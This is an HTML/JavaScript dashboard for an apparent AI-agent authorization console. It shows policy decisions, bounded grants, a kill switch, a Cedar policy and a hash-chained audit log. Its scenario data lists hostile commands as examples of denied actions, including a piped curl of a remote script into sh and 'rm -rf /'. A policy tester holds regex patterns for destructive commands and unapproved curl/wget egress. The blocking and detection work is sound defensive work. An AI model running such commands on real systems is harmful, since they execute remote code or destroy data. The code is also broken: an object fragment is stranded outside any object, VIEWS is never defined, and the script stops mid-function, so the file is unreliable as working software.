<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>BAP · Agent operations</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Schibsted+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#eceff3; --surface:#ffffff; --surface2:#f5f7fa; --ink:#121c2b; --muted:#59687a; --line:#d6dce4;
  --allow:#0e7a69; --allow-bg:#dff3ee; --deny:#c0352a; --deny-bg:#fbe5e2; --unk:#a86a0c; --unk-bg:#fbefd6;
  --step:#6b3fc7; --step-bg:#ece4fa; --accent:#2b4bdc; --accent-bg:#e3e9fd; --side:#0f1a2b; --side-ink:#c5d0df;
  --sans:'Schibsted Grotesk',system-ui,-apple-system,'Segoe UI',sans-serif; --mono:'JetBrains Mono',ui-monospace,Menlo,Consolas,monospace;
}
@media (prefers-color-scheme:dark){
  :root:not([data-theme="light"]){
    --bg:#0b1220; --surface:#121b2c; --surface2:#182337; --ink:#e7edf6; --muted:#93a3b8; --line:#26334a;
    --allow:#3fd0b4; --allow-bg:#10312d; --deny:#ff7a6e; --deny-bg:#3a1a19; --unk:#f0b45a; --unk-bg:#3a2c10;
    --step:#b79cff; --step-bg:#2a2147; --accent:#7f9bff; --accent-bg:#1b274d; --side:#070d18;
  }
}
:root[data-theme="dark"]{
  --bg:#0b1220; --surface:#121b2c; --surface2:#182337; --ink:#e7edf6; --muted:#93a3b8; --line:#26334a;
  --allow:#3fd0b4; --allow-bg:#10312d; --deny:#ff7a6e; --deny-bg:#3a1a19; --unk:#f0b45a; --unk-bg:#3a2c10;
  --step:#b79cff; --step-bg:#2a2147; --accent:#7f9bff; --accent-bg:#1b274d; --side:#070d18;
}
*{box-sizing:border-box}
html,body{height:100%}
body{margin:0;background:var(--bg);color:var(--ink);font:15px/1.5 var(--sans);-webkit-font-smoothing:antialiased;
  padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
button,input,select,textarea{font:inherit;color:inherit}
:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
.app{display:grid;grid-template-columns:232px 1fr;min-height:100%}
/* sidebar */
.side{background:var(--side);color:var(--side-ink);padding:18px 12px;position:sticky;top:0;height:100vh;overflow:auto}
.brand{display:flex;gap:10px;align-items:center;padding:4px 8px 18px}
.brand svg{flex:none}
.brand b{display:block;color:#fff;font-size:16px;letter-spacing:.2px}
.brand span{font-size:12px;opacity:.7}
.nav-group{margin:14px 0 4px;padding:0 10px;font-size:12px;opacity:.55}
.nav button{display:flex;align-items:center;gap:10px;width:100%;background:none;border:0;color:inherit;text-align:left;padding:9px 10px;border-radius:8px;cursor:pointer;font-weight:500}
.nav button:hover{background:rgba(255,255,255,.07)}
.nav button[aria-current="page"]{background:rgba(255,255,255,.13);color:#fff}
.nav .cnt{margin-left:auto;font:500 11px var(--mono);background:rgba(255,255,255,.12);padding:1px 7px;border-radius:99px}
.nav .cnt.hot{background:var(--deny);color:#fff}
.side-foot{margin-top:22px;padding:10px;border-top:1px solid rgba(255,255,255,.1);font-size:12px;opacity:.8}
/* main */
.main{min-width:0;padding:0 28px 48px}
.top{display:flex;gap:12px;align-items:center;flex-wrap:wrap;padding:18px 0;position:sticky;top:0;background:var(--bg);z-index:5;border-bottom:1px solid var(--line);margin-bottom:22px}
.top h1{font-size:22px;margin:0;font-weight:700;letter-spacing:-.2px}
.top .sub{color:var(--muted);font-size:13px}
.spacer{flex:1}
.pill{display:inline-flex;align-items:center;gap:7px;padding:5px 11px;border-radius:99px;border:1px solid var(--line);background:var(--surface);font-size:13px;cursor:pointer}
.dot{width:8px;height:8px;border-radius:50%;background:var(--unk)}
.dot.live{background:var(--allow);box-shadow:0 0 0 3px var(--allow-bg)}
.dot.error{background:var(--deny);box-shadow:0 0 0 3px var(--deny-bg)}
.btn{border:1px solid var(--line);background:var(--surface);padding:7px 13px;border-radius:8px;cursor:pointer;font-weight:500}
.btn:hover{background:var(--surface2)}
.btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}
.btn.danger{background:var(--deny);border-color:var(--deny);color:#fff}
.btn.ghost{background:none}
.btn.sm{padding:4px 9px;font-size:13px}
.btn[disabled]{opacity:.5;cursor:not-allowed}
/* panels */
.panel{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:18px}
.panel h2{margin:0 0 2px;font-size:16px}
.panel .hint{color:var(--muted);font-size:13px;margin:0 0 14px}
.grid{display:grid;gap:16px}
.g-kpi{grid-template-columns:repeat(auto-fit,minmax(170px,1fr));margin-bottom:16px}
.g-2{grid-template-columns:minmax(0,1.6fr) minmax(0,1fr)}
.g-eq{grid-template-columns:repeat(auto-fit,minmax(300px,1fr))}
@media(max-width:1000px){.g-2{grid-template-columns:1fr}}
.kpi{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
.kpi small{color:var(--muted);font-size:13px}
.kpi strong{display:block;font-size:28px;font-weight:700;letter-spacing:-.5px;margin-top:2px;font-variant-numeric:tabular-nums}
.kpi em{font-style:normal;font-size:12.5px;color:var(--muted)}
.kpi.bad strong{color:var(--deny)} .kpi.good strong{color:var(--allow)}
/* tags */
.tag{display:inline-flex;align-items:center;padding:2px 9px;border-radius:99px;font-size:12px;font-weight:600}
.t-ALLOW,.t-allow{background:var(--allow-bg);color:var(--allow)}
.t-DENY,.t-deny{background:var(--deny-bg);color:var(--deny)}
.t-UNKNOWN,.t-unknown{background:var(--unk-bg);color:var(--unk)}
.t-STEP_UP,.t-step_up{background:var(--step-bg);color:var(--step)}
.t-COMPLIANT,.t-compliant{background:var(--allow-bg);color:var(--allow)}
.t-ACTIVE,.t-active{background:var(--allow-bg);color:var(--allow)}
.t-QUARANTINED,.t-quarantined,.t-REVOKED,.t-revoked{background:var(--deny-bg);color:var(--deny)}
.t-COOPERATIVE_BYOD,.t-closed,.t-CLOSED{background:var(--surface2);color:var(--muted);border:1px solid var(--line)}
.t-LIVE,.t-live{background:rgba(34,197,94,.12);color:var(--allow);border:1px solid rgba(34,197,94,.25)}
.t-OFFLINE,.t-offline,.t-deregistered{background:var(--surface2);color:var(--muted);border:1px solid var(--line)}
.t-INTENT,.t-intent{background:rgba(59,130,246,.15);color:var(--accent);border:1px solid rgba(59,130,246,.3)}
.dot-live{display:inline-block;width:6px;height:6px;border-radius:50%;background:var(--allow);box-shadow:0 0 6px var(--allow);margin-right:6px}
.dot-offline{display:inline-block;width:6px;height:6px;border-radius:50%;background:var(--muted);margin-right:6px}
.mono{font-family:var(--mono);font-size:12.5px}
/* tables */
.tw{overflow-x:auto}
table{width:100%;border-collapse:collapse}
th{text-align:left;font-size:12.5px;color:var(--muted);font-weight:600;padding:8px 10px;border-bottom:1px solid var(--line);white-space:nowrap}
td{padding:10px;border-bottom:1px solid var(--line);vertical-align:middle}
tr.click{cursor:pointer} tr.click:hover td{background:var(--surface2)}
tbody tr:last-child td{border-bottom:0}
.empty{padding:28px;text-align:center;color:var(--muted)}
/* stream */
.stream{max-height:360px;overflow:auto;margin:0 -6px}
.row{display:grid;grid-template-columns:62px 1fr auto;gap:10px;padding:9px 6px;border-bottom:1px solid var(--line);align-items:center;cursor:pointer;border-radius:6px}
.row:hover{background:var(--surface2)}
.row .cmd{font:500 13px var(--mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.row .who{font-size:12.5px;color:var(--muted)}
.row .tm{font:12px var(--mono);color:var(--muted)}
/* planes */
.planes{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:0;margin-bottom:16px;border:1px solid var(--line);border-radius:12px;overflow:hidden;background:var(--surface)}
.plane{padding:13px 16px;border-right:1px solid var(--line);position:relative}
.plane:last-child{border-right:0}
.plane b{display:block;font-size:14px}
.plane span{font-size:12.5px;color:var(--muted)}
.plane i{position:absolute;right:14px;top:14px;width:9px;height:9px;border-radius:50%;background:var(--allow)}
.plane i.warn{background:var(--unk)}
.plane i.bad{background:var(--deny)}
@media(max-width:800px){.planes{grid-template-columns:repeat(2,1fr)}.plane:nth-child(2){border-right:0}.plane:nth-child(-n+2){border-bottom:1px solid var(--line)}}
/* bars */
.bar{height:8px;border-radius:99px;background:var(--surface2);overflow:hidden;border:1px solid var(--line)}
.bar>div{height:100%;background:var(--accent)}
.reason{display:grid;grid-template-columns:1fr 40px;gap:4px 10px;margin-bottom:12px;font-size:13.5px}
.reason .bar{grid-column:1/-1}
/* chain */
.chain{display:flex;gap:0;overflow-x:auto;padding:6px 2px 14px;align-items:stretch}
.blk{flex:none;width:176px;border:1.5px solid var(--line);border-radius:10px;padding:10px;background:var(--surface);position:relative;margin-right:26px}
.blk::after{content:"";position:absolute;right:-27px;top:50%;width:26px;height:2px;background:var(--line)}
.blk:last-child{margin-right:0}.blk:last-child::after{display:none}
.blk b{font-size:13px}
.blk .h{font:11.5px var(--mono);color:var(--muted);word-break:break-all;margin-top:4px}
.blk .p{font-size:12.5px;margin-top:6px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.blk.ok{border-color:var(--allow)} .blk.ok::after{background:var(--allow)}
.blk.bad{border-color:var(--deny);background:var(--deny-bg)} .blk.bad::after{background:var(--deny)}
.blk.pending{opacity:.7}
.verdict{padding:12px 14px;border-radius:10px;margin-top:6px;font-weight:500}
.verdict.ok{background:var(--allow-bg);color:var(--allow)} .verdict.bad{background:var(--deny-bg);color:var(--deny)}
/* forms */
label.f{display:block;font-size:13px;color:var(--muted);margin-bottom:4px}
input[type=text],input[type=password],select,textarea{width:100%;padding:9px 11px;border:1px solid var(--line);border-radius:8px;background:var(--surface);}
textarea{font:13px/1.55 var(--mono);min-height:280px;resize:vertical;tab-size:2}
.seg{display:inline-flex;border:1px solid var(--line);border-radius:9px;overflow:hidden;background:var(--surface)}
.seg button{border:0;background:none;padding:6px 14px;cursor:pointer;font-weight:500}
.seg button[aria-pressed="true"]{background:var(--accent);color:#fff}
.layer{display:flex;gap:12px;align-items:flex-start;padding:12px;border:1px solid var(--line);border-radius:10px;margin-bottom:10px}
.layer .ic{flex:none;width:30px;height:30px;border-radius:8px;display:grid;place-items:center;font-weight:700;background:var(--accent-bg);color:var(--accent)}
.layer small{color:var(--muted);display:block}
pre.out{background:var(--surface2);border:1px solid var(--line);border-radius:10px;padding:12px;font:12.5px/1.55 var(--mono);overflow:auto;margin:10px 0 0;white-space:pre-wrap;word-break:break-word}
/* drawer & modal */
.scrim{position:fixed;inset:0;background:rgba(5,10,20,.45);z-index:20;display:none}
.scrim.on{display:block}
.drawer{position:fixed;top:0;right:0;bottom:0;width:min(480px,100%);background:var(--surface);z-index:21;border-left:1px solid var(--line);padding:22px;overflow:auto;transform:translateX(100%);transition:transform .22s ease;padding-top:calc(22px + env(safe-area-inset-top,0px))}
.drawer.on{transform:none}
.drawer h3{margin:0 0 4px}
dl.kv{display:grid;grid-template-columns:120px 1fr;gap:8px 12px;margin:16px 0}
dl.kv dt{color:var(--muted);font-size:13px} dl.kv dd{margin:0;word-break:break-word}
.modal{position:fixed;z-index:22;left:50%;top:50%;transform:translate(-50%,-50%);width:min(440px,calc(100% - 28px));background:var(--surface);border:1px solid var(--line);border-radius:14px;padding:22px;display:none}
.modal.on{display:block}
.modal h3{margin:0 0 6px}
.modal .acts{display:flex;gap:8px;justify-content:flex-end;margin-top:16px}
.toasts{position:fixed;left:50%;transform:translateX(-50%);bottom:calc(18px + env(safe-area-inset-bottom,0px));z-index:30;display:grid;gap:8px}
.toast{background:var(--ink);color:var(--bg);padding:10px 16px;border-radius:9px;font-size:14px;box-shadow:0 6px 24px rgba(0,0,0,.25)}
.banner{display:none;background:var(--deny);color:#fff;padding:10px 14px;border-radius:10px;margin-bottom:16px;font-weight:600}
.banner.on{display:flex;gap:12px;align-items:center}
.filters{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:14px}
.filters input{max-width:280px}.filters select{width:auto}
.menu-btn{display:none}
@media(max-width:860px){
  .app{grid-template-columns:1fr}
  .side{position:fixed;z-index:15;left:0;top:0;width:250px;transform:translateX(-100%);transition:transform .2s}
  .side.on{transform:none}
  .menu-btn{display:inline-flex}
  .main{padding:0 14px 40px}
}
@media(prefers-reduced-motion:reduce){*{transition:none!important;animation:none!important}}
</style>
</head>
<body>
<div class="app">
  <aside class="side" id="side">
    <div class="brand">
      <svg width="34" height="34" viewBox="0 0 34 34" aria-hidden="true"><path d="M17 2 29 7v9c0 8-5 13.5-12 16C10 29.500 5 24 5 16V7z" fill="none" stroke="#7f9bff" stroke-width="2"/><path d="M11 17.500l4 4 8-9" fill="none" stroke="#3fd0b4" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg>
      <div><b>BAP Control Plane</b><span>Bounded Authority Plane</span></div>
    </div>
    <nav class="nav" id="nav" aria-label="Sections"></nav>
    <div class="side-foot">
      <div id="sideMode">Live control plane</div>
      <button class="btn sm ghost" style="color:inherit;border-color:rgba(255,255,255,.25);margin-top:8px" id="themeBtn">Toggle theme</button>
    </div>
  </aside>

  <main class="main">
    <header class="top">
      <button class="btn menu-btn" id="menuBtn" aria-label="Open menu">Menu</button>
      <div><h1 id="title">Overview</h1><div class="sub" id="subtitle"></div></div>
      <div class="spacer"></div>
      <button class="pill" id="connPill"><span class="dot live" id="connDot"></span><span id="connTxt">Live control plane</span></button>
      <button class="btn" id="pauseBtn">Pause stream</button>
      <button class="btn danger" id="killBtn">Kill switch</button>
    </header>
    <div class="banner" id="killBanner"><span>Kill switch is ON. All agents are failing closed and no new grants are being minted.</span><span class="spacer"></span><button class="btn sm" id="killOff" style="color:var(--ink)">Resume</button></div>
    <div id="view"></div>
  </main>
</div>

<div class="scrim" id="scrim"></div>
<aside class="drawer" id="drawer" aria-label="Details"></aside>
<div class="modal" id="modal" role="dialog" aria-modal="true"></div>
<div class="toasts" id="toasts" aria-live="polite"></div>

<script>
'use strict';
/* ---------- helpers ---------- */
const $ = (s,r=document)=>r.querySelector(s);
const esc = s=>String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const pick = a=>a[Math.floor(Math.random()*a.length)];
const hex = n=>Array.from({length:n},()=>Math.floor(Math.random()*16).toString(16)).join('');
const fmtT = d=>d instanceof Date ? d.toLocaleTimeString([], {hour12:false}) : String(d||'');
const timeAgo = d => {
  if(!d) return 'Never';
  const dt = d instanceof Date ? d : new Date(d);
  if(isNaN(dt.getTime())) return '-';
  const sec = Math.floor((Date.now() - dt.getTime()) / 1000);
  if(sec < 5) return 'just now';
  if(sec < 60) return sec + 's ago';
  if(sec < 3600) return Math.floor(sec/60) + 'm ago';
  if(sec < 86400) return Math.floor(sec/3600) + 'h ago';
  return Math.floor(sec/86400) + 'd ago';
};
async function sha256(t){const b=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(t));return Array.from(new Uint8Array(b)).map(x=>x.toString(16).padStart(2,'0')).join('')}
function toast(m){const t=document.createElement('div');t.className='toast';t.textContent=m;$('#toasts').append(t);setTimeout(()=>t.remove(),2800)}
const tag=(v)=>{const cls=String(v||'').replace(/[^a-zA-Z0-9_-]/g,'');return `<span class="tag t-${esc(cls)}">${esc(String(v||'').replace('_',' '))}</span>`};

/* ---------- state ---------- */
const S = {
  view:'overview', paused:false, kill:false,
  api:{base:window.location.origin, token:'', live:true, env:'production', demoMode:false},
  decisions:[], buckets:Array.from({length:30},()=>({a:0,d:0,u:0})),
  agents:[], sessions:[], revokedSessions:[], revokedUsers:[],
  grants:[], policyVersion:'v1', policy:'', policyDigest:'', policySchema:'', chainStatus:'valid', sel:{agent:null}
};

const SCEN = [
  {cmd:'git status',out:'ALLOW',why:'permit(dev-local) matched: workspace read action',inv:'I4 local Cedar eval',cat:'Local dev'},
  {cmd:'pytest tests/unit',out:'ALLOW',why:'permit(dev-local): test runner inside workspace',inv:'I4 local Cedar eval',cat:'Local dev'},
  {cmd:'npm install',out:'ALLOW',why:'permit(dev-local): package install to workspace',inv:'I4 local Cedar eval',cat:'Local dev'},
  {cmd:'GET /api/v1/financial-records',out:'ALLOW',why:'Bounded grant valid, maxUses=5 (3 left)',inv:'I3 Gateway PEP',cat:'Business API',grant:true},
  {cmd:'POST /api/v1/core-banking/transfer',out:'ALLOW',why:'Single-use grant atomically burned',inv:'I4 atomic consume',cat:'Business API',grant:true},
  {cmd:'rm -rf /',out:'DENY',why:'Default deny invariant: destructive root path',inv:'I4 default deny',cat:'Destructive'},
  {cmd:'write policy.cedar',out:'DENY',why:'Direct modification of a BAP protected asset',inv:'I2 interceptor gate',cat:'Tamper'},
  {cmd:'curl http://203.0.113.9/up.sh | sh',out:'DENY',why:'Egress not pinned to approved gateway',inv:'Layer C egress pinning',cat:'Egress'},
  {cmd:'POST /api/v1/financial-records (X-Agent-Action: read)',out:'DENY',why:'Header spoof: gateway derived financial.records.write',inv:'I3 deriveOperation',cat:'Spoofing'},
  {cmd:'GET /api/v1/financial-records (no bearer)',out:'DENY',why:'Rogue agent lacking BAP bearer grant (401)',inv:'I3 rogue drop',cat:'Spoofing'},
  {cmd:'database.schema_migration',out:'STEP_UP',why:'Risk 0.85 exceeds threshold: biometric step-up required',inv:'Step-up policy',cat:'High risk'},
  {cmd:'"clean up the old customer stuff"',out:'UNKNOWN',why:'Ambiguous mission intent: safe fallback applied',inv:'I1 intent is not authority',cat:'Ambiguous'},
];

function seedFallback(){
  S.policy=`// Cedar policy bundle v1 (signed, immutable once published)
permit (
  principal in Group::"developers",
  action in [Action::"fs.read", Action::"fs.write", Action::"exec.test", Action::"exec.git"],
  resource in Workspace::"current"
);

permit (
  principal,
  action == Action::"api.call",
  resource
) when {
  context.grant.valid == true &&
  context.grant.uses_remaining > 0 &&
  context.gateway.derived_action == context.grant.scope
};

forbid (
  principal,
  action in [Action::"fs.write", Action::"fs.delete"],
  resource in ProtectedAsset::"bap"
);

forbid (
  principal,
  action == Action::"exec.destructive",
  resource
);

forbid (
  principal,
  action == Action::"net.egress",
  resource
) unless { resource.host in Gateway::"approved" };

// step up for high-risk operations
forbid (principal, action, resource)
when { context.risk_score > 0.7 && context.step_up != true };`;

  S.grants=[
    {id:'grt_9f2a41c0',agent:'agent-claude-0412',scope:'financial.records.read',max:5,used:2,ttl:540,res:'/api/v1/financial-records'},
    {id:'grt_41bd77e2',agent:'agent-worker-0911',scope:'core-banking.transfer',max:1,used:0,ttl:120,res:'/api/v1/core-banking/transfer'},
    {id:'grt_c03e19aa',agent:'agent-claude-0501',scope:'database.schema_migration',max:1,used:1,ttl:0,res:'/api/v1/db/migrations'},
    {id:'grt_72e0d5b1',agent:'agent-python-0620',scope:'etl.warehouse.write',max:20,used:11,ttl:1800,res:'/api/v1/warehouse'},
    {id:'grt_ab18f604',agent:'agent-copilot-0377',scope:'ci.artifacts.read',max:10,used:3,ttl:900,res:'/api/v1/ci/artifacts'},
  ];
}

/* ---------- API client ---------- */
function getHeaders(){
  const h = {'Accept':'application/json'};
  if(S.api.token){
    h['Authorization'] = 'Bearer ' + S.api.token;
    h['X-BAP-Admin-Token'] = S.api.token;
  }
  return h;
}

async function fetchTelemetry(){
  try {
    const res = await fetch(S.api.base + '/api/v1/inspector/data', {
      headers: getHeaders()
    });
    if(!res.ok) {
      if(res.status === 401 || res.status === 403) {
        // Needs admin auth for full details, but let's check what came back
      }
      return;
    }
    const data = await res.json();
    ingestServerData(data);
    S.api.live = true;
    connUI();
  } catch (err) {
    console.warn('Control plane fetch error:', err);
  }
}

function ingestServerData(data){
  if(!data) return;
  if(data.policy_cedar) S.policy = data.policy_cedar;
  if(data.policy_version) S.policyVersion = data.policy_version;
  if(data.policy_digest) S.policyDigest = data.policy_digest;
  if(data.policy_schema) S.policySchema = data.policy_schema;
  if(typeof data.kill_switch === 'boolean') {
    S.kill = data.kill_switch;
    $('#killBanner').classList.toggle('on', S.kill);
    $('#killBtn').textContent = S.kill ? 'Kill switch is on' : 'Kill switch';
  }
  if(data.chain_status) S.chainStatus = data.chain_status;
  if(Array.isArray(data.revoked_sessions)) S.revokedSessions = data.revoked_sessions;
  if(Array.isArray(data.revoked_users)) S.revokedUsers = data.revoked_users;

  // Ingest agents
  const now = Date.now();
  if(Array.isArray(data.agents)) {
    S.agents = data.agents.map(a => {
      const isRev = (a.status === 'revoked' || S.revokedSessions.includes(a.instance_id) || S.revokedUsers.includes(a.owner_email));
      const lastHB = a.last_heartbeat_at ? new Date(a.last_heartbeat_at).getTime() : (a.created_at ? new Date(a.created_at).getTime() : 0);
      const isStale = (!lastHB) || (now - lastHB > 45000);
      const isLive = (a.status === 'active') && !isStale && !isRev;
      const liveness = isRev ? 'REVOKED' : (isLive ? 'LIVE' : 'OFFLINE');
      const compState = isRev ? 'QUARANTINED' : 'COMPLIANT';

      return {
        id: a.agent_id || a.instance_id || 'unknown',
        instanceId: a.instance_id || '',
        name: a.agent_name || a.app_id || 'Workload Agent',
        appId: a.app_id || '',
        host: a.hostname || a.instance_id || 'edge-endpoint',
        os: a.os || a.os_info || (a.hostname && a.hostname.includes('DESKTOP') ? 'windows' : 'linux'),
        state: compState,
        liveness: liveness,
        lastHeartbeat: a.last_heartbeat_at ? new Date(a.last_heartbeat_at) : null,
        layers: [1, 1, 1],
        mission: a.mission || 'Agent workload execution',
        risk: isRev ? 0.95 : 0.15,
        raw: a
      };
    });
  }

  // Ingest sessions
  if(Array.isArray(data.sessions)) {
    S.sessions = data.sessions;
    // Only synthesize an agent entry if data.agents was completely empty
    if(S.agents.length === 0) {
      const seen = new Set();
      data.sessions.forEach(sess => {
        const key = sess.instance_id || sess.app_id || sess.session_id;
        if(seen.has(key)) return;
        seen.add(key);
        const isRev = (sess.status === 'revoked' || S.revokedSessions.includes(sess.session_id) || S.revokedUsers.includes(sess.user_email));
        const lastAct = sess.last_active_at ? new Date(sess.last_active_at).getTime() : (sess.started_at ? new Date(sess.started_at).getTime() : 0);
        const isLive = (sess.status === 'active') && (now - lastAct <= 45000) && !isRev;
        S.agents.push({
          id: sess.instance_id ? ('agent-' + (sess.app_id || 'workload') + '-' + sess.instance_id) : sess.session_id,
          instanceId: sess.instance_id || '',
          name: sess.agent_name || sess.app_id || 'Agent',
          appId: sess.app_id || '',
          host: sess.hostname || 'edge-endpoint',
          os: 'windows',
          state: isRev ? 'QUARANTINED' : 'COMPLIANT',
          liveness: isRev ? 'REVOKED' : (isLive ? 'LIVE' : 'OFFLINE'),
          lastHeartbeat: lastAct ? new Date(lastAct) : null,
          layers: [1, 1, 1],
          mission: sess.user_prompt || (sess.intent && sess.intent.primary) || 'Autonomous operations',
          risk: isRev ? 0.95 : (sess.denied_count > 0 ? 0.65 : 0.12),
          raw: sess
        });
      });
    }
  }

  // Ingest audit events as decisions
  if(Array.isArray(data.central_events) && data.central_events.length > 0) {
    const rawEvents = [...data.central_events].reverse();
    S.decisions = rawEvents.map(e => {
      const out = (e.decision || 'allow').toUpperCase();
      const host = e.hostname || 'workstation';
      const osName = e.os || (host.toLowerCase().includes('desktop') || host.toLowerCase().includes('win') ? 'windows' : (host.toLowerCase().includes('mac') ? 'macos' : 'linux'));
      const isPrompt = out === 'INTENT' || e.executable === 'user_prompt';
      const whyText = e.reason || (out === 'ALLOW' ? 'Permitted by active policy' : (isPrompt ? 'User mission intent classified at BAP edge' : 'Denied by BAP zero-trust policy'));
      const invText = e.decision_rule || (out === 'ALLOW' ? 'I4 local Cedar eval' : (isPrompt ? 'Layer A prompt classification' : 'I4 default deny'));

      return {
        id: e.event_id || ('dec_' + hex(8)),
        ts: new Date(e.timestamp || Date.now()),
        agent: {
          id: e.session_id || 'unknown',
          name: e.source || 'claude-code',
          host: host,
          os: osName,
          mission: e.user_prompt || 'Task execution'
        },
        cmd: e.full_command || e.executable || 'exec',
        out: out,
        why: whyText,
        inv: invText,
        cat: e.primary_intent || (e.full_command && e.full_command.startsWith('git') ? 'Local dev' : (isPrompt ? 'Prompt Context' : 'Business API')),
        grant: e.grant_id || null,
        latency: +(e.duration_ms || (0.4 + Math.random()*1.2)).toFixed(2),
        hash: e.event_hash || hex(64),
        raw: e
      };
    });
    // Recompute buckets
    recalcBuckets();
  }

  drawNav();
  if(S.view === 'overview') {
    const d=S.decisions,den=d.filter(x=>x.out==='DENY').length,al=d.filter(x=>x.out==='ALLOW').length;
    if($('#k1')) $('#k1').textContent = d.length;
    if($('#k2')) $('#k2').textContent = d.length ? (Math.round(al/d.length*100)+'%') : '100%';
    if($('#k3')) $('#k3').textContent = den;
    chart(); reasons(); liveList();
  } else if(S.view === 'decisions') {
    const dt = $('#dt');
    if(dt) VIEWS.decisions.after();
  } else if(S.view === 'agents' || S.view === 'sessions') {
    render();
  }
}

function recalcBuckets(){
  S.buckets = Array.from({length:30},()=>({a:0,d:0,u:0}));
  const now = Date.now();
  const span = 30 * 60 * 1000; // 30 mins
  S.decisions.forEach(d => {
    const age = now - d.ts.getTime();
    if(age >= 0 && age < span) {
      const idx = 29 - Math.floor(age / (span / 30));
      if(idx >= 0 && idx < 30) {
        if(d.out === 'ALLOW') S.buckets[idx].a++;
        else if(d.out === 'DENY') S.buckets[idx].d++;
        else S.buckets[idx].u++;
      }
    }
  });
}

function chart(){
  const el=$('#chart');if(!el)return;
  const W=640,H=170,bw=W/S.buckets.length, max=Math.max(8,...S.buckets.map(b=>b.a+b.d+b.u));
  let s=`<svg viewBox="0 0 ${W} ${H+4}" width="100%" role="img" aria-label="Decisions per interval, stacked by outcome" style="display:block">`;
  [0,.5,1].forEach(f=>{const y=H-f*H;s+=`<line x1="0" x2="${W}" y1="${y}" y2="${y}" stroke="var(--line)" stroke-dasharray="3 4"/>`});
  S.buckets.forEach((b,i)=>{let y=H;[['a','--allow'],['u','--unk'],['d','--deny']].forEach(([k,c])=>{const h=b[k]/max*H;y-=h;if(h>0)s+=`<rect x="${i*bw+2}" y="${y}" width="${bw-4}" height="${h}" rx="2" fill="var(${c})"/>`})});
  el.innerHTML=s+'</svg>';
}
function reasons(){
  const el=$('#reasons');if(!el)return;
  const m={};S.decisions.filter(d=>d.out!=='ALLOW').forEach(d=>m[d.inv]=(m[d.inv]||0)+1);
  const rows=Object.entries(m).sort((a,b)=>b[1]-a[1]).slice(0,6), mx=rows[0]?rows[0][1]:1;
  el.innerHTML=rows.length?rows.map(([k,v])=>`<div class="reason"><span>${esc(k)}</span><b style="text-align:right">${v}</b><div class="bar"><div style="width:${v/mx*100}%;background:var(--deny)"></div></div></div>`).join(''):'<div class="empty">No denials recorded yet.</div>';
}

/* Policies */
function evalCmd(c){
  const x=c.toLowerCase();
  if(/policy\.cedar|bap-config|\.bap\/|managed-settings/.test(x))return{out:'DENY',why:'forbid: write to ProtectedAsset::"bap" (I2 interceptor gate)'};
  if(/rm\s+-rf\s+\/|mkfs|dd\s+if=|format\s+c:|:\(\)\{/.test(x))return{out:'DENY',why:'forbid: Action::"exec.destructive" (default deny invariant)'};
  if(/curl|wget|invoke-webrequest/.test(x)&&/https?:\/\/(?!gateway\.)/.test(x))return{out:'DENY',why:'forbid: Action::"net.egress" host not in Gateway::"approved"'};
  if(/schema_migration|drop\s+table|truncate/.test(x))return{out:'STEP_UP',why:'forbid unless step_up: risk_score 0.85 is above 0.7'};
  if(/^(get|post|put|delete)\s+\/api\//.test(x))return{out:'ALLOW',why:'permit api.call only if a valid bounded grant covers the derived action'};
  if(/^(git|pytest|npm|cargo|go test|ls|dir|cat|python -m unittest)\b/.test(x))return{out:'ALLOW',why:'permit: developers group, exec.test or exec.git inside the current workspace'};
  return{out:'UNKNOWN',why:'No policy matched. Safe fallback applies and the action is held (I1)'};
}
function runWhy(){const v=$('#whyIn').value.trim();if(!v)return;const r=evalCmd(v);$('#whyOut').innerHTML=`<div style="margin-top:12px">${tag(r.out)}</div><pre class="out">${esc(v)}\n-> ${esc(r.why)}</pre>`}

/* Audit chain */
let CHAIN=[];
async function buildChain(){
  CHAIN=[];let prev='0'.repeat(64);
  const ev=['session.start','intent.classified','policy.decision','grant.minted','pep.authorize','grant.burned','exec.complete','policy.decision','agent.heartbeat','pep.deny','intent.classified','policy.decision'];
  for(let i=0;i<ev.length;i++){const payload=ev[i]+' #'+(1000+i);const h=await sha256(prev+payload);CHAIN.push({i,payload,orig:payload,prev,hash:h});prev=h}
}
async function audit(type,detail){
  const prev=CHAIN.length?CHAIN[CHAIN.length-1].hash:'0'.repeat(64),payload=type+' '+detail,hash=await sha256(prev+payload);
  CHAIN.push({i:CHAIN.length,payload,orig:payload,prev,hash});if(S.view==='audit')render();
}

  html(){return `<div class="panel"><div style="display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:6px"><div><h2>Hash chain</h2><p class="hint" style="margin:0">Each block commits to the one before it. Change one record and every later block stops matching.</p></div><span class="spacer"></span>
    <button class="btn" id="tamper">Simulate tampering</button><button class="btn" id="restore">Restore</button><button class="btn primary" id="verify">Verify chain</button></div>
    <div class="chain" id="chain"></div><div id="vres"></div></div>
    <div class="panel" style="margin-top:16px"><h2>Recent events</h2><p class="hint">Newest first. Approvals and policy changes made in this console are recorded here too.</p><div class="tw"><table><thead><tr><th>#</th><th>Event</th><th>Hash</th></tr></thead><tbody>${CHAIN.slice(-8).reverse().map(b=>`<tr><td class="mono">${b.i}</td><td>${esc(b.payload)}</td><td class="mono">${b.hash.slice(0,24)}...</td></tr>`).join('')}</tbody></table></div></div>`},
  after(){drawChain();
    $('#verify').onclick=verifyChain;
